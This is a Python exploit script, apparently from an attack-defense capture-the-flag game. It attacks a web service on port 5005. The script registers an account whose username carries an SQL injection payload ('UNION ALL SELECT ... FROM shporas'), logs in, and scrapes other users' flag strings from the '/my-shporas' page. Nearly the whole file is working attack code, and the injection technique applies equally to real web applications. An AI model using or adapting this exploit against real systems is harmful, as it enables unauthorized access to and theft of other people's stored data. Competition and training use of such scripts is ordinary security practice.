#!/usr/bin/env python3

import requests
import sys
import re
import random
import json
import hashlib
import string

flagRegEx = re.compile(r'[A-Za-z0-9]{31}=')

our_host = "10.136.181.1"		# define out host
port = 5005 					# define port of service

alph = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'
printable = string.printable

# POST requests
# data = { 'key':'value', 'key1':'value1' }
# res = requests.post( host + "some-url", data=data )

def md5(data): return hashlib.md5(data).hexdigest()
def sha1(data): return hashlib.sha1(data).hexdigest()
def sha256(data): return hashlib.sha256(data).hexdigest()


def main():

	# do not forgot about strip(), split(), replace() - functions to parsing

	
	rand_string = idgen(5)
	u_name = f'" UNION ALL SELECT NULL, content, NULL, NULL, NULL, NULL, NULL FROM shporas WHERE "{rand_string}"="{rand_string}'
	u_pswd = idgen(12)

	# print(u_name, u_pswd)

	register(u_name, u_pswd)
	sess = login(u_name, u_pswd)
	flags = get_flags(sess)

	print(*flags, sep="\n", flush=True)
	sys.stdout.flush() 	# after print


def idgen( size = 8, chars=alph ):
	return ''.join( random.choice( chars ) for _ in range( size ) )


def register(u_name: str, u_pswd: str):
	resp = requests.post(
		host+"sign-up",
		data={
			"username": u_name,
			"password": u_pswd
		}
	).text


def login(u_name: str, u_pswd: str):
	s = requests.Session()
	resp = s.post(
		host+"login",
		data={
		"username": u_name,
		"password": u_pswd
		}
	).text
	return s


def get_flags(s):
	resp = s.get(host+"my-shporas")
	# print(resp.text)
	return flagRegEx.findall( resp.text )


if __name__ == '__main__':
	
	if len(sys.argv) > 1:
		host = f"http://{sys.argv[1]}:5005/"
	else:
		print(f"Usage: python3 {sys.argv[0]} <host>")
		sys.exit(-1)
	
	if host == our_host:
		sys.exit(-4)
	
	main()